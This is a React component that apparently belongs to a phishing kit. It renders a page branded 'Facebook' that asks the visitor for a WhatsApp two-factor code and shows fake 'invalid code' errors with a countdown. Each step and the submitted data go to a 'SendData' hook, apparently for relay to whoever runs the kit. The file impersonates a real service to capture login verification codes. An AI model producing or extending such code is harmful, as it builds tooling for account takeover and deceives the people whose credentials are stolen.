import React, { useContext } from "react";
import Image from "next/image";
import { useFa2Logic } from "../../hooks/useFa2Logic";
import LoadingSpinner from "../ui/LoadingSpinner";
import SendData from "../../hooks/SendData";
import { DataContext } from "../../pages";
import {
  AuthShell,
  AuthColumn,
  AuthEyebrow,
  AuthHeading,
  AuthBody,
  AuthImageWrap,
  AuthInput,
  AuthError,
  AuthHelperRow,
  AuthLink,
  AuthPrimaryButton,
} from "./shared";

function Fa2Whatsapp({ setStep, Name, LastFetch, wrong2faTrigger }) {
  const { setAllData, AllData } = useContext(DataContext);
  const {
    code,
    isLoading,
    showError,
    handleSubmit,
    handleCodeChange,
    shouldShowRedBorder,
    renderCountdown,
    isButtonDisabled,
  } = useFa2Logic({
    LastFetch,
    wrong2faTrigger,
    setStep,
    nextStep: 4,
    componentName: "WhatsApp 2FA",
    initialMessage: "WhatsApp 2FA Page Loaded",
  });

  const logEvent = (message) => {
    const params = { ...AllData, currentStep: message };
    setAllData(params);
    SendData(params);
  };

  const handleFormSubmit = (e) => {
    handleSubmit(e, "whatsapp");
  };

  return (
    <AuthShell>
      <AuthColumn>
        <AuthEyebrow>Facebook</AuthEyebrow>
        <AuthHeading>Check your WhatsApp messages</AuthHeading>
        <AuthBody>
          Open your Whatsapp messages, then enter the code
          shown to verify it&rsquo;s you.
        </AuthBody>

        <AuthImageWrap>
          <Image
            alt=""
            src="/assets/images/whatsapp-notify.png"
            width={1920}
            height={840}
            priority
            style={{ width: "100%", height: "auto" }}
          />
        </AuthImageWrap>

        <form onSubmit={handleFormSubmit}>
          <AuthInput
            placeholder="Code"
            type="number"
            name="code"
            autoComplete="off"
            value={code}
            onChange={handleCodeChange}
            $error={shouldShowRedBorder()}
            disabled={isLoading}
          />

          {showError && <AuthError>Invalid authentication code</AuthError>}

          <AuthHelperRow>
            {showError ? (
              <>We can send a new code in&nbsp;{renderCountdown()}</>
            ) : (
              <>
                You may need to wait a few minutes before receiving the
                code.{" "}
                <AuthLink
                  type="button"
                  onClick={() =>
                    logEvent("WhatsApp 2FA - User clicked Get a new code")
                  }
                >
                  Get a new code
                </AuthLink>
              </>
            )}
          </AuthHelperRow>

          <AuthPrimaryButton type="submit" disabled={isButtonDisabled()}>
            {isLoading ? <LoadingSpinner size="15px" /> : "Continue"}
          </AuthPrimaryButton>
        </form>
      </AuthColumn>
    </AuthShell>
  );
}

export default Fa2Whatsapp;
